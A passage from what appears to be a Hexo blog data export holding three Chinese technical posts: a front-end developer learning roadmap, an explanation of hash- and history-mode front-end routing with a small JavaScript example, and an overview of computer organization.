title=\"概述\"></a>概述</h1><p>针对Web前端开发者，知识图谱分为通用部分和前端专有部分。该篇整理自给出的参考文档，主要作备忘及对照梳理自己的知识结构。<br></p>","more":"<p></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"通用知识\"><a href=\"#通用知识\" class=\"headerlink\" title=\"通用知识\"></a>通用知识</h2><p><img src=\"/2019-04-23-developer-roadmap-2019/1.jpg\" alt=\"通用知识图谱\"></p>\n<ol>\n<li><p>Git<br>最流行的版本控制系统之一。没有 Git 再也无法生存。</p>\n</li>\n<li><p>SSH<br>它允许你远程登录到另一台主机，这是另一个流行的、每个 Web 开发人员都应该知道的网络概念。</p>\n</li>\n<li><p>HTTP/HTTPS<br>HTTP 协议是 Web 的基础，对于 Web 开发人员来说，必须熟悉 HTTP 和 HTTPS。</p>\n</li>\n<li><p>终端的基本用法：Linux 命令行基础<br>不仅仅是 Web 开发人员，对于任何程序员来说，Linux 命令行都是非常非常重要的，我强烈建议你花一些时间来学习它们。</p>\n</li>\n<li><p>数据结构和算法<br>这是任何程序的构建块，更好地了解算法和数据结构是你在下一份工作或当前工作中做得更好的关键。</p>\n</li>\n<li><p>字符编码<br>如果你正在创建全球应用程序，其中显示了世界上许多不同语言的信息，那么你应该精通字符编码。它本质上是告诉浏览器如何显示你的数据。</p>\n</li>\n<li><p>GitHub<br>毫无疑问，每个程序员都应该了解 Git 和 Github，因为它们是版本控制和代码库方面的标准。</p>\n</li>\n</ol>\n<h2 id=\"专有知识\"><a href=\"#专有知识\" class=\"headerlink\" title=\"专有知识\"></a>专有知识</h2><p><img src=\"/2019-04-23-developer-roadmap-2019/2.png\" alt=\"专有知识\"></p>\n<ol>\n<li><p>Web 开发基础<br>显然，如果你想成为一名 Web 开发人员，那么你应该了解互联网、Web 应用程序、HTTP 之类的协议以及 Web 开发的基础知识。</p>\n</li>\n<li><p>HTML 和 CSS<br>HTML 和 CSS 是任何网站的基础。HTML 提供了结构，而 CSS 提供了样式，使它们看起来更好看，更具有视觉吸引力。如果你想成为一个真正的前端开发人员，那么你必须掌握这两方面的知识。</p>\n</li>\n<li><p>JavaScript<br>就像面向对象编程的四大支柱（抽象、封装、多态和继承）一样，Web 开发也有三大支柱，即 HTML、CSS 和 JavaScript。前两个提供了结构和样式，但正是 JavaScript 通过添加交互性使它们变得有生气。</p>\n</li>\n<li><p>TypeScript<br>就像我们有 C 和 C++ 一样，TypeScript 可以看成是 JavaScript++，尽管它不像 C++ 那么流行。TypeScript 的好处在于它在 JavaScript 代码中增加了类型安全，这意味着你可以在开发阶段捕获与 JavaScript 类型相关的错误。它还使得为 JavaScript 开发面向对象代码变得更容易。</p>\n</li>\n<li><p>Angular<br>人们使用纯 HTML、CSS 和 JavaScript 构建网站的日子已经一去不复返了。如今，大部分工作都是由 Angular、React JS 或 Vue.js 这样的框架完成的。它们不仅提供了存储代码的结构，而且使快速开发 Web 应用程序变得很容易。Angular 由谷歌支持，因此，学习 Angular 对于任何现代 Web 开发人员来说都是一个不错的选择。</p>\n</li>\n<li><p>React JS<br>与 Angular 类似，React 也是开发 Web 应用程序的一个流行库。它允许你编写可重用的组件，然后你可以使用这些组件创建现代风格的交互式 Web 页面。就像 Angular 由谷歌支持一样，React 也有 Facebook 支持，因此非常受欢迎。</p>\n</li>\n<li><p>Vue.js<br>Vue 或 Vue JS 在去年真的加快了步伐，越来越多的人推荐和使用 Vue.js。我仍然是 Vue 的初学者，可能需要一些时间来学习并迁移到基于 Vue 的应用程序中。</p>\n</li>\n</ol>\n<p>关于前端开发者应该学哪些内容，强烈推荐大家去读这篇文章，里面有非常详细的前端开发者学习指南：<br><a href=\"https://frontendmasters.com/books/front-end-handbook/2019/\" target=\"_blank\" rel=\"noopener\">https://frontendmasters.com/books/front-end-handbook/2019/</a></p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://github.com/kamranahmedse/developer-roadmap\" target=\"_blank\" rel=\"noopener\">https://github.com/kamranahmedse/developer-roadmap</a><br><a href=\"https://mp.weixin.qq.com/s/mz3yoUvPc6R_4byA3wKCJw\" target=\"_blank\" rel=\"noopener\">https://mp.weixin.qq.com/s/mz3yoUvPc6R_4byA3wKCJw</a></p>"},{"title":"前端路由原理基础","date":"2019-05-22T07:17:09.000Z","updated":"2019-05-22T07:17:09.000Z","keywords":null,"description":null,"_content":"\n# 概述\n\n对于当下组件化的 SPA 应用，前端路由是一个重要组成部分，不管是 react 还是 vue，都有各自的前端路由插件。那么前端路由的基础是什么呢？本文针对 hash 与 history 模式的实现基础做个总结。[测试源码](https://github.com/jovysun/my-router)\n![测试效果预览图](my-router.gif)\n\n<!-- more -->\n\n# 详述\n\n对于单页面应用，每个页面都是组件，页面切换即组件切换，前端路由要实现的就是页面的切换，不引起刷新，同时浏览器的 history 对象中都有记录，这样才能保证“前进”“后退”有效。\n\n## hash 模式\n\nhash 是 URL 中的 hash 部分，直观表现为#及其后面的部分，例如`#/dashboard`。通常通过 a 标签实现页面锚点定位。特点就是改变 hash 部分不会引起页面的刷新，但是却可以触发 hashchange 事件。因此可以通过这个特性实现前端路由。\n\n## history 模式\n\nHTML5 引入了 history.pushState() 和 history.replaceState() 方法，它们分别可以添加和修改历史记录条目。这些方法通常与 window.onpopstate 配合使用。因此也可以通过这个特性实现前端路由。[API 详细知识见 MDN](https://developer.mozilla.org/zh-CN/docs/Web/API/History_API)\n\n## 两种模式的优缺点\n\nhash 模式兼容性好，简单，但是不美观。history 模式美观，但是不兼容 IE8 及以下，刷新会报错，需要后端配置处理。\n\n## 简单实现\n\n糙了一点，但是对于理解两种模式的路由基础实现应该可以了。\n\n```js\nwindow.addEventListener(\"DOMContentLoaded\", readyHandler);\nfunction readyHandler() {\n  console.log(\"dom ready+++++++++++++++\");\n\n  let myContentDom = document.getElementById(\"myContent\");\n\n  // 路由\n  function router() {\n    let route = \"\";\n    if (location.hash) {\n      route = location.hash.split(\"#\")[1];\n    } else {\n      route = location.pathname;\n    }\n\n    let component = null;\n    switch (route) {\n      case \"/dashboard\":\n        component = { txt: \"我是Dashboard组件\" };\n        break;\n      case \"/my\":\n        component = { txt: \"我是My组件\" };\n        break;\n      default:\n        break;\n    }\n    renderDom(component);\n  }\n  // 渲染组件\n  function renderDom(component) {\n    myContentDom.innerHTML = component.txt;\n  }\n\n  // hash事件处理\n  function hashchangeHandler() {\n    router();\n  }\n  window.addEventListener(\"hashchange\", hashchangeHandler);\n\n  // history事件处理\n  function popstateHandler() {\n    router();\n  }\n  window.addEventListener(\"popstate\", popstateHandler);\n\n  document\n    .getElementById(\"historyBlock\")\n    .addEventListener(\"click\", function(e) {\n      // 阻止链接点击默认跳转事件\n      e.preventDefault();\n      // 添加历史，实现浏览器前进后退\n      history.pushState(null, \"\", e.target.href);\n      popstateHandler();\n    });\n}\n```\n","source":"_posts/2019/05/my-router.md","raw":"---\ntitle: 前端路由原理基础\npermalink: 前端路由原理基础\ntags:\n  - JavaScript\ncategories:\n  - 其他\ndate: 2019-05-22 15:17:09\nupdated: 2019-05-22 15:17:09\nkeywords:\ndescription:\n---\n\n# 概述\n\n对于当下组件化的 SPA 应用，前端路由是一个重要组成部分，不管是 react 还是 vue，都有各自的前端路由插件。那么前端路由的基础是什么呢？本文针对 hash 与 history 模式的实现基础做个总结。[测试源码](https://github.com/jovysun/my-router)\n![测试效果预览图](my-router.gif)\n\n<!-- more -->\n\n# 详述\n\n对于单页面应用，每个页面都是组件，页面切换即组件切换，前端路由要实现的就是页面的切换，不引起刷新，同时浏览器的 history 对象中都有记录，这样才能保证“前进”“后退”有效。\n\n## hash 模式\n\nhash 是 URL 中的 hash 部分，直观表现为#及其后面的部分，例如`#/dashboard`。通常通过 a 标签实现页面锚点定位。特点就是改变 hash 部分不会引起页面的刷新，但是却可以触发 hashchange 事件。因此可以通过这个特性实现前端路由。\n\n## history 模式\n\nHTML5 引入了 history.pushState() 和 history.replaceState() 方法，它们分别可以添加和修改历史记录条目。这些方法通常与 window.onpopstate 配合使用。因此也可以通过这个特性实现前端路由。[API 详细知识见 MDN](https://developer.mozilla.org/zh-CN/docs/Web/API/History_API)\n\n## 两种模式的优缺点\n\nhash 模式兼容性好，简单，但是不美观。history 模式美观，但是不兼容 IE8 及以下，刷新会报错，需要后端配置处理。\n\n## 简单实现\n\n糙了一点，但是对于理解两种模式的路由基础实现应该可以了。\n\n```js\nwindow.addEventListener(\"DOMContentLoaded\", readyHandler);\nfunction readyHandler() {\n  console.log(\"dom ready+++++++++++++++\");\n\n  let myContentDom = document.getElementById(\"myContent\");\n\n  // 路由\n  function router() {\n    let route = \"\";\n    if (location.hash) {\n      route = location.hash.split(\"#\")[1];\n    } else {\n      route = location.pathname;\n    }\n\n    let component = null;\n    switch (route) {\n      case \"/dashboard\":\n        component = { txt: \"我是Dashboard组件\" };\n        break;\n      case \"/my\":\n        component = { txt: \"我是My组件\" };\n        break;\n      default:\n        break;\n    }\n    renderDom(component);\n  }\n  // 渲染组件\n  function renderDom(component) {\n    myContentDom.innerHTML = component.txt;\n  }\n\n  // hash事件处理\n  function hashchangeHandler() {\n    router();\n  }\n  window.addEventListener(\"hashchange\", hashchangeHandler);\n\n  // history事件处理\n  function popstateHandler() {\n    router();\n  }\n  window.addEventListener(\"popstate\", popstateHandler);\n\n  document\n    .getElementById(\"historyBlock\")\n    .addEventListener(\"click\", function(e) {\n      // 阻止链接点击默认跳转事件\n      e.preventDefault();\n      // 添加历史，实现浏览器前进后退\n      history.pushState(null, \"\", e.target.href);\n      popstateHandler();\n    });\n}\n```\n","slug":"前端路由原理基础","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8xh0061wovvuro2109h","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>对于当下组件化的 SPA 应用，前端路由是一个重要组成部分，不管是 react 还是 vue，都有各自的前端路由插件。那么前端路由的基础是什么呢？本文针对 hash 与 history 模式的实现基础做个总结。<a href=\"https://github.com/jovysun/my-router\" target=\"_blank\" rel=\"noopener\">测试源码</a><br><img src=\"/前端路由原理基础/my-router.gif\" alt=\"测试效果预览图\"></p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><p>对于单页面应用，每个页面都是组件，页面切换即组件切换，前端路由要实现的就是页面的切换，不引起刷新，同时浏览器的 history 对象中都有记录，这样才能保证“前进”“后退”有效。</p>\n<h2 id=\"hash-模式\"><a href=\"#hash-模式\" class=\"headerlink\" title=\"hash 模式\"></a>hash 模式</h2><p>hash 是 URL 中的 hash 部分，直观表现为#及其后面的部分，例如<code>#/dashboard</code>。通常通过 a 标签实现页面锚点定位。特点就是改变 hash 部分不会引起页面的刷新，但是却可以触发 hashchange 事件。因此可以通过这个特性实现前端路由。</p>\n<h2 id=\"history-模式\"><a href=\"#history-模式\" class=\"headerlink\" title=\"history 模式\"></a>history 模式</h2><p>HTML5 引入了 history.pushState() 和 history.replaceState() 方法，它们分别可以添加和修改历史记录条目。这些方法通常与 window.onpopstate 配合使用。因此也可以通过这个特性实现前端路由。<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/History_API\" target=\"_blank\" rel=\"noopener\">API 详细知识见 MDN</a></p>\n<h2 id=\"两种模式的优缺点\"><a href=\"#两种模式的优缺点\" class=\"headerlink\" title=\"两种模式的优缺点\"></a>两种模式的优缺点</h2><p>hash 模式兼容性好，简单，但是不美观。history 模式美观，但是不兼容 IE8 及以下，刷新会报错，需要后端配置处理。</p>\n<h2 id=\"简单实现\"><a href=\"#简单实现\" class=\"headerlink\" title=\"简单实现\"></a>简单实现</h2><p>糙了一点，但是对于理解两种模式的路由基础实现应该可以了。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">window</span>.addEventListener(<span class=\"string\">\"DOMContentLoaded\"</span>, readyHandler);</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">readyHandler</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">\"dom ready+++++++++++++++\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> myContentDom = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"myContent\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 路由</span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">router</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> route = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (location.hash) &#123;</span><br><span class=\"line\">      route = location.hash.split(<span class=\"string\">\"#\"</span>)[<span class=\"number\">1</span>];</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      route = location.pathname;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">let</span> component = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (route) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">\"/dashboard\"</span>:</span><br><span class=\"line\">        component = &#123; <span class=\"attr\">txt</span>: <span class=\"string\">\"我是Dashboard组件\"</span> &#125;;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">\"/my\"</span>:</span><br><span class=\"line\">        component = &#123; <span class=\"attr\">txt</span>: <span class=\"string\">\"我是My组件\"</span> &#125;;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">default</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    renderDom(component);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">// 渲染组件</span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">renderDom</span>(<span class=\"params\">component</span>) </span>&#123;</span><br><span class=\"line\">    myContentDom.innerHTML = component.txt;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// hash事件处理</span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">hashchangeHandler</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    router();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">window</span>.addEventListener(<span class=\"string\">\"hashchange\"</span>, hashchangeHandler);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// history事件处理</span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">popstateHandler</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    router();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">window</span>.addEventListener(<span class=\"string\">\"popstate\"</span>, popstateHandler);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">document</span></span><br><span class=\"line\">    .getElementById(<span class=\"string\">\"historyBlock\"</span>)</span><br><span class=\"line\">    .addEventListener(<span class=\"string\">\"click\"</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">e</span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"comment\">// 阻止链接点击默认跳转事件</span></span><br><span class=\"line\">      e.preventDefault();</span><br><span class=\"line\">      <span class=\"comment\">// 添加历史，实现浏览器前进后退</span></span><br><span class=\"line\">      history.pushState(<span class=\"literal\">null</span>, <span class=\"string\">\"\"</span>, e.target.href);</span><br><span class=\"line\">      popstateHandler();</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>对于当下组件化的 SPA 应用，前端路由是一个重要组成部分，不管是 react 还是 vue，都有各自的前端路由插件。那么前端路由的基础是什么呢？本文针对 hash 与 history 模式的实现基础做个总结。<a href=\"https://github.com/jovysun/my-router\" target=\"_blank\" rel=\"noopener\">测试源码</a><br><img src=\"/前端路由原理基础/my-router.gif\" alt=\"测试效果预览图\"></p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><p>对于单页面应用，每个页面都是组件，页面切换即组件切换，前端路由要实现的就是页面的切换，不引起刷新，同时浏览器的 history 对象中都有记录，这样才能保证“前进”“后退”有效。</p>\n<h2 id=\"hash-模式\"><a href=\"#hash-模式\" class=\"headerlink\" title=\"hash 模式\"></a>hash 模式</h2><p>hash 是 URL 中的 hash 部分，直观表现为#及其后面的部分，例如<code>#/dashboard</code>。通常通过 a 标签实现页面锚点定位。特点就是改变 hash 部分不会引起页面的刷新，但是却可以触发 hashchange 事件。因此可以通过这个特性实现前端路由。</p>\n<h2 id=\"history-模式\"><a href=\"#history-模式\" class=\"headerlink\" title=\"history 模式\"></a>history 模式</h2><p>HTML5 引入了 history.pushState() 和 history.replaceState() 方法，它们分别可以添加和修改历史记录条目。这些方法通常与 window.onpopstate 配合使用。因此也可以通过这个特性实现前端路由。<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/History_API\" target=\"_blank\" rel=\"noopener\">API 详细知识见 MDN</a></p>\n<h2 id=\"两种模式的优缺点\"><a href=\"#两种模式的优缺点\" class=\"headerlink\" title=\"两种模式的优缺点\"></a>两种模式的优缺点</h2><p>hash 模式兼容性好，简单，但是不美观。history 模式美观，但是不兼容 IE8 及以下，刷新会报错，需要后端配置处理。</p>\n<h2 id=\"简单实现\"><a href=\"#简单实现\" class=\"headerlink\" title=\"简单实现\"></a>简单实现</h2><p>糙了一点，但是对于理解两种模式的路由基础实现应该可以了。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">window</span>.addEventListener(<span class=\"string\">\"DOMContentLoaded\"</span>, readyHandler);</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">readyHandler</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">\"dom ready+++++++++++++++\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> myContentDom = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"myContent\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 路由</span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">router</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> route = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (location.hash) &#123;</span><br><span class=\"line\">      route = location.hash.split(<span class=\"string\">\"#\"</span>)[<span class=\"number\">1</span>];</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      route = location.pathname;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">let</span> component = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (route) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">\"/dashboard\"</span>:</span><br><span class=\"line\">        component = &#123; <span class=\"attr\">txt</span>: <span class=\"string\">\"我是Dashboard组件\"</span> &#125;;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">\"/my\"</span>:</span><br><span class=\"line\">        component = &#123; <span class=\"attr\">txt</span>: <span class=\"string\">\"我是My组件\"</span> &#125;;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">default</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    renderDom(component);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">// 渲染组件</span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">renderDom</span>(<span class=\"params\">component</span>) </span>&#123;</span><br><span class=\"line\">    myContentDom.innerHTML = component.txt;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// hash事件处理</span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">hashchangeHandler</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    router();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">window</span>.addEventListener(<span class=\"string\">\"hashchange\"</span>, hashchangeHandler);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// history事件处理</span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">popstateHandler</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    router();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">window</span>.addEventListener(<span class=\"string\">\"popstate\"</span>, popstateHandler);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">document</span></span><br><span class=\"line\">    .getElementById(<span class=\"string\">\"historyBlock\"</span>)</span><br><span class=\"line\">    .addEventListener(<span class=\"string\">\"click\"</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">e</span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"comment\">// 阻止链接点击默认跳转事件</span></span><br><span class=\"line\">      e.preventDefault();</span><br><span class=\"line\">      <span class=\"comment\">// 添加历史，实现浏览器前进后退</span></span><br><span class=\"line\">      history.pushState(<span class=\"literal\">null</span>, <span class=\"string\">\"\"</span>, e.target.href);</span><br><span class=\"line\">      popstateHandler();</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"计算机组成原理——总览","date":"2019-04-30T06:17:54.000Z","updated":"2019-04-30T06:17:54.000Z","_content":"\n# 概述\n\n编程好多年，越来越发现上层的应用技术日新月异，但是基本原理都是一样的。浮华之后，突然很想静下来好好梳理下底层的一些知识。作为开篇，先来个整体的知识地图，以后可以按图索骥，不断完善各个知识点。\n![计算机组成原理知识地图](0.jpg)\n\n<!-- more -->\n\n# 详述\n\n## 硬件设备组成\n\n1. CPU：最核心配件，三大件之一，全名叫中央处理器（Central Processing Unit）。计算机的所有“计算”都是由 CPU 来进行的。\n2. 内存：三大件之一，你撰写的程序、打开的浏览器、运行的游戏，都要加载到内存里才能运行。程序读取的数据、计算得到的结果，也都要放在内存里。\n3. 主板：三大件之一，CPU 和内存及其他配件的载体。主板有很多插槽，可以放各种对应的配件。主板的芯片组（Chipset）和总线（Bus）解决了 CPU 和内存之间如何通信的问题。芯片组控制了数据传输的流转，也就是数据从哪里到哪里的问题。总线则是实际数据传输的高速公路。因此，总线速度（Bus Speed）决定了数据能传输得多快。\n4. 硬盘：外部存储设备。\n5. 鼠标、键盘：输入设备；\n6. 显示器：输出设备。\n   有了三大件，只要配上电源供电，计算机差不多就可以跑起来了。但是使用还缺少输入输出设备（I/O 设备），加了这个才能输入指令，输出结果。\n\n另外还有一个很特殊的配件显卡（Graphics Card）。有内置显卡和独立显卡，如果你用计算机玩游戏，做图形渲染或者跑深度学习应用，你多半就需要买一张单独的显卡，插在主板上。显卡之所以特殊，是因为显卡里有除了 CPU 之外的另一个“处理器”，也就是（Graphics Processing Unit，图形处理器），GPU 一样可以做各种“计算”的工作。\n\n## 冯·诺依曼体系结构\n\n![冯·诺依曼体系结构](1.jpg)\n任何一台计算机的任何一个部件都可以归到运算器、控制器、存储器、输入设备和输出设备中，而所有的现代计算机也都是基于这个基础架构来设计开发的。\n\n# 参考\n\n极客时间——深入浅出计算机组成原理\n","source":"_posts/2019/04/2019-04-30-computer-organization-overview.md","raw":"---\ntitle: 计算机组成原理——总览\ntags:\n  - 计算机\ncategories:\n  - 基础\n  - 计算机组成原理\ndate: 2019-04-30 14:17:54\nupdated: 2019-04-30 14:17:54\n---\n\n# 概述\n\n编程好多年，越来越发现上层的应用技术日新月异，但是基本原理都是一样的。浮华之后，突然很想静下来好好梳理下底层的一些知识。作为开篇，先来个整体的知识地图，以后可以按图索骥，不断完善各个知识点。\n![计算机组成原理知识地图](0.jpg)\n\n<!-- more -->\n\n# 详述\n\n## 硬件设备组成\n\n1. CPU：最核心配件，三大件之一，全名叫中央处理器（Central Processing Unit）。计算机的所有“计算”都是由 CPU 来进行的。\n2. 内存：三大件之一，你撰写的程序、打开的浏览器、运行的游戏，都要加载到内存里才能运行。程序读取的数据、计算得到的结果，也都要放在内存里。\n3. 主板：三大件之一，CPU 和内存及其他配件的载体。主板有很多插槽，可以放各种对应的配件。主板的芯片组（Chipset）和总线（Bus）解决了 CPU 和内存之间如何通信的问题。芯片组控制了数据传输的流转，也就是数据从哪里到哪里的问题。总线则是实际数据传输的高速公路。因此，总线速度（Bus Speed）决定了数据能传输得多快。\n4. 硬盘：外部存储设备。\n5. 鼠标、键盘：输入设备；\n6. 显示器：输出设备。\n   有了三大件，只要配上电源供电，计算机差不多就可以跑起来了。但是使用还缺少输入输出设备（I/O 设备），加了这个才能输入指令，输出结果。\n\n另外还有一个很特殊的配件显卡（Graphics Card）。有内置显卡和独立显卡，如果你用计算机玩游戏，做图形渲染或者跑深度学习应用，你多半就需要买一张单独的显卡，插在主板上。显卡之所以特殊，是因为显卡里有除了 CPU 之外的另一个“处理器”，也就是（Graphics Processing Unit，图形处理器），GPU 一样可以做各种“计算”的工作。\n\n## 冯·诺依曼体系结构\n\n![冯·诺依曼体系结构](1.jpg)\n任何一台计算机的任何一个部件都可以归到运算器、控制器、存储器、输入设备和输出设备中，而所有的现代计算机也都是基于这个基础架构来设计开发的。\n\n# 